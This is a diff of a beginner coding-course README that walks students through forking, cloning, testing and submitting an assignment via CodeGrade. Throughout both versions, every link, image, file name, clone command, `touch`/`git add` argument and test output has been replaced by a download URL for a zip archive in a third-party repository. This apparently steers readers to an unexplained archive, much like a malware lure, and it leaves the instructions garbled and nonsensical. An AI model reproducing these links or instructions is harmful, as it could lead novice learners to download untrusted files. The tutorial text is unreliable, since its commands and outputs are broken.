@@ -32,14 +32,14 @@ your assignments and submit them using CodeGrade.
 
 ## Completing and Submitting Assignments
 
-<iframe width="640" height="480" src="https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip" title="Completing and Submitting Software Engineering Assignments" frameborder="0" allowfullscreen></iframe>
+<iframe width="640" height="480" src="https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip" title="Completing and Submitting Software Engineering Assignments" frameborder="0" allowfullscreen></iframe>
 
 ### A Quick Note on Organizing Work on Your Machine
 
 Throughout this course, you will be downloading many assignments, so it is
 important to keep your code organized. If you haven't yet, we recommend that you
 go through the steps in
-[the previous lesson](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+[the previous lesson](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 to set up a directory where you can keep all of your work for this course.
 
 > **Note:** The process we'll go through in this lesson will create sub-folders
@@ -54,7 +54,7 @@ All the lessons in this course have a corresponding repository (repo) in GitHub.
 On this page in Canvas, you should see two icons in the **upper right** corner.
 The first is the GitHub logo, also known as OctoCat.
 
-![Screenshot pointing to OctoCat icon](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Screenshot pointing to OctoCat icon](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Clicking the OctoCat icon will open the lesson's GitHub repo. The second icon is
 a flag, which you can use to submit an _issue_ for the lesson (e.g., if you find
@@ -63,11 +63,11 @@ a typo or other error).
 To fork an assignment, click the **OctoCat** button to open its GitHub repo. In
 the top right corner of the repo, you should see a button that says **Fork**.
 
-![Screenshot point out 'Fork' button](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Screenshot point out 'Fork' button](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Click on that, and you should get a screen that looks something like this:
 
-![Screenshot of the 'Create a new fork' form](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Screenshot of the 'Create a new fork' form](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 In the **Owner** dropdown, select your GitHub username, then click the **Create
 fork** button.
@@ -86,7 +86,7 @@ To download the repository for this lesson, first make sure you're in your
 personal fork on GitHub. You can check this by looking in the top left of the
 GitHub repository, where it shows the name.
 
-![Screenshot showing example of forked repo](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Screenshot showing example of forked repo](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 If you see your GitHub username before the name of the repo,
 phase-0-completing-assignments-codegrade, as well as a subtitle saying "forked
@@ -96,12 +96,12 @@ Once you're in your forked version of the repo, click the **Code** button. A
 pop-up will appear which shows several options for cloning: **HTTPS**, **SSH**,
 and **GitHub CLI**. **Before doing anything else**, be sure to switch to
 **SSH**. With **SSH** selected, you should see what looks sort of like an email
-in the box below, starting with `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip`. You should see your GitHub
+in the box below, starting with `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip`. You should see your GitHub
 name after the `:`.
 
 From here, click the copy button.
 
-![clone-repo](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![clone-repo](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Now, open your terminal and navigate to where you'd like to download the
 assignment (e.g. `cd ~/Development/code/se-prep`). Type `git clone` and a space,
@@ -109,7 +109,7 @@ then paste in the copied SSH link from GitHub. It should look something like
 this:
 
 ```console
-$ git clone https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+$ git clone https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 ```
 
 Press enter, and you should see a flurry of terminal activity.
@@ -124,7 +124,7 @@ $ cd phase-0-completing-assignments-codegrade
 
 Now type `code .` (assuming you're using Visual Studio Code as your text editor)
 to open up a text editor window with access to all of the assignment's files.
-These instructions are now also available on your local machine in `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip`.
+These instructions are now also available on your local machine in `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip`.
 
 > Note: the first time you open a directory in Visual Studio Code, you'll see a
 > message asking "Do you trust the authors of the files in this folders?" This
@@ -134,7 +134,7 @@ These instructions are now also available on your local machine in `https://raw.
 > every time you open a lesson. Just be sure to download your code from trusted
 > sources!
 
-[workspace-trust]: https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+[workspace-trust]: https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 
 ### Working on an Assignment
 
@@ -162,18 +162,18 @@ passed one test!
 ```console
 This assignment
   ✓ has been correctly cloned to your local environment
-  1) has a file named https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+  1) has a file named https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 
 1) This assignment
-      has a file named https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
-    AssertionError: No file named 'https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip' found. Create one in the root of the assignment's directory: value: expected 'https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip' to exist
+      has a file named https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
+    AssertionError: No file named 'https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip' found. Create one in the root of the assignment's directory: value: expected 'https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip' to exist
 
 1 passing (5ms)
 1 failing
 ```
 
 > **Note:** If you got a "command not found" error, or a different error aside
-> from the AssertionError shown above, go back to the https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip installation
+> from the AssertionError shown above, go back to the https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip installation
 > lesson for your OS. Go through the steps provided there to make sure Node was
 > installed correctly. If you're still receiving different errors, we recommend
 > going back through all local environment setup instructions again to ensure
@@ -184,12 +184,12 @@ gave us a detailed "AssertionError" saying why we did not pass the test:
 
 ```console
 1) This assignment
-      has a file named https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
-    AssertionError: No file named 'https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip' found. Create one in the root of the assignment's directory: value: expected 'https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip' to exist
+      has a file named https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
+    AssertionError: No file named 'https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip' found. Create one in the root of the assignment's directory: value: expected 'https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip' to exist
 ```
 
 We can use this error to figure out what we need to do to pass it. In this case,
-we just need to create a file called `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip` inside the assignment
+we just need to create a file called `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip` inside the assignment
 directory. Let's create it with the CLI commands we just learned.
 
 In the terminal, make sure you're in the root of the assignment directory
@@ -207,10 +207,10 @@ If you're not already in the root, `cd` into it.
 $ cd phase-0-completing-assignments-codegrade
 ```
 
-Then use the `touch` command to create `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip`.
+Then use the `touch` command to create `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip`.
 
 ```console
-$ touch https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+$ touch https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 ```
 
 To make sure it was created successfully in the correct area, use the `ls`
@@ -218,8 +218,8 @@ command. The output should look like:
 
 ```console
 $ ls
-https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip         https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip               node_modules            https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
-https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip              https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip               https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip       test
+https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip         https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip               node_modules            https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
+https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip              https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip               https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip       test
 ```
 
 When you run `npm test` in the terminal again, both tests should now be passing!
@@ -227,7 +227,7 @@ When you run `npm test` in the terminal again, both tests should now be passing!
 ```console
   This assignment
     ✓ has been correctly cloned to your local environment
-    ✓ has a file named https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+    ✓ has a file named https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 
 
   2 passing (4ms)
@@ -250,11 +250,11 @@ tests:
 ### Pushing your Changes to GitHub
 
 If you go to your **forked** version of the assignment on GitHub, you'll see
-that the `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip` file you created is not there. Notice in the screenshot
-below, for example, `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip` exists in the local VS Code editor, but not
+that the `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip` file you created is not there. Notice in the screenshot
+below, for example, `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip` exists in the local VS Code editor, but not
 anywhere in the forked GitHub repo.
 
-![Screenshot showing https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip in VS Code, but not in GitHub](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Screenshot showing https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip in VS Code, but not in GitHub](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 This is because you only made the change on your _local clone_. Changes that you
 make on a locally cloned repository are not automatically synced to the repo up
@@ -274,9 +274,9 @@ allow you to turn in your assignments. If you have questions about these git
 commands, however, you are free to refer to those later lessons.
 
 [basics]:
-  https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+  https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 [pushing-with-git]:
-  https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+  https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 
 These commands should be run in the terminal within the directory with changes
 to push. For example with this assignment, you should be running the following
@@ -292,7 +292,7 @@ To track specific files, you just need to add the file names as arguments. For
 example:
 
 ```bash
-git add https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip
+git add https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip
 ```
 
 To track all files at once, you can use a period as an argument instead `.`:
@@ -321,7 +321,7 @@ message in quotes.
 Let's commit our tracked change. In the terminal, run:
 
 ```bash
-git commit -m "creates https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip"
+git commit -m "creates https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip"
 ```
 
 #### Push changes with `git push`
@@ -364,7 +364,7 @@ git push origin main
 ```
 
 Now, finally, when you load your forked version of the assignment on GitHub, you
-should see the `https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip` file! With all your work now available on GitHub, you
+should see the `https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip` file! With all your work now available on GitHub, you
 can submit the assignment.
 
 **Note:** It is a good habit to get into to go to your repo on GitHub after you
@@ -379,7 +379,7 @@ To submit your work for grading, head back to the assignment on Canvas and
 scroll down to the bottom of the page. There, you should see a button that says
 "Load Complete Your First Software Engineering Assignment in a new window".
 
-![Load Complete Your First Software Engineering Assignment in a new window button](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Load Complete Your First Software Engineering Assignment in a new window button](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Click on that button, and a new window of the CodeGrade interface should open
 up. As you haven't submitted an assignment for this lab yet, click on the
@@ -389,7 +389,7 @@ should only have to do this step the first time you create a submission.) Once
 CodeGrade is authorized, as long as you're logged in to GitHub, CodeGrade should
 be connected to your account.
 
-![Gif showing the CodeGrade interface, creating a submission, and connecting to GitHub](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Gif showing the CodeGrade interface, creating a submission, and connecting to GitHub](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Once your GitHub account is connected, you should see a list of your repos in
 the CodeGrade window. Find the repo that matches the assignment you're
@@ -399,7 +399,7 @@ the blue "Connect" button.
 When CodeGrade finishes connecting the repo, it should show you a success
 message with a link to view your submission. Click on that link.
 
-![Gif showing how to connect a GitHub repo on CodeGrade](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Gif showing how to connect a GitHub repo on CodeGrade](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 On this new page, there are three different tabs: Code, Feedback Overview, and
 AutoTest.
@@ -414,7 +414,7 @@ can see the progress in the small box on the right side of the Setup section.
 When it's done, it will say "Done" and your score will update in the Automatic
 Tests section.
 
-![Gif showing the AutoTest running and completing](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Gif showing the AutoTest running and completing](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 If you don't pass, don't fret, you can still fix it! You can click on the
 test(s) within the Automatic Tests section to see which ones failed. Then, you
@@ -428,7 +428,7 @@ back to CodeGrade through the button on Canvas. Instead of on "Create
 submission", click on the "Latest submission" button to get taken back to the
 AutoTest page.
 
-![Gif showing how to navigate back to AutoTest via the Latest submission button](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![Gif showing how to navigate back to AutoTest via the Latest submission button](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Once your tests are all passing in CodeGrade, you are good to go. You can close
 the CodeGrade window and move on to the next lesson.
@@ -460,7 +460,7 @@ $ xcode-select --install
 ```
 
 And follow the prompts. Then try running the `git clone` command again. See
-[this Stack Overflow post](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip) for more
+[this Stack Overflow post](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip) for more
 details. Note that you may need to re-install `xcode-select` any time you update
 your Mac OS version.
 
@@ -479,7 +479,7 @@ their instructions carefully.
 
 1. Make sure that you've connected the correct repo to CodeGrade. You can do
    that by clicking on the "Code" tab in CodeGrade and verifying that the title
-   of the lab in the https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip file matches the title in Canvas. If you've
+   of the lab in the https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip file matches the title in Canvas. If you've
    connected the wrong repo, follow the instructions in the next section.
 
 2. Re-run the tests in your local environment to verify that they are passing.
@@ -501,7 +501,7 @@ through the submission process again and select the correct repo. When you do
 that, you will see a message warning you that you have already connected to the
 repo and asking if you want to disconnect the current repo and select a new one:
 
-![disconnect repo button](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![disconnect repo button](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Click the "Disconnect and select new repository" button. This will return you to
 the list of repos where you can select the new repo to connect.
@@ -558,12 +558,12 @@ For both portfolio projects and blog posts, you'll need to manually submit a
 link to your work on Canvas. While viewing the assignment, you should see a
 **Submit Assignment** button in the upper-right section of the page.
 
-![submit assignment button](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![submit assignment button](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Clicking this button will bring you to the bottom of the page where you can
 submit a URL link to your work.
 
-![submit assignment form](https://raw.githubusercontent.com/deerrickkorir/phase-0-completing-assignments-codegrade/main/test/assignments_codegrade_phase_completing_2.4.zip)
+![submit assignment form](https://github.com/deerrickkorir/phase-0-completing-assignments-codegrade/raw/refs/heads/main/.github/completing-codegrade-phase-assignments-v3.1.zip)
 
 Upon submission you should see confetti appear, indicating that your submission
 has been accepted.
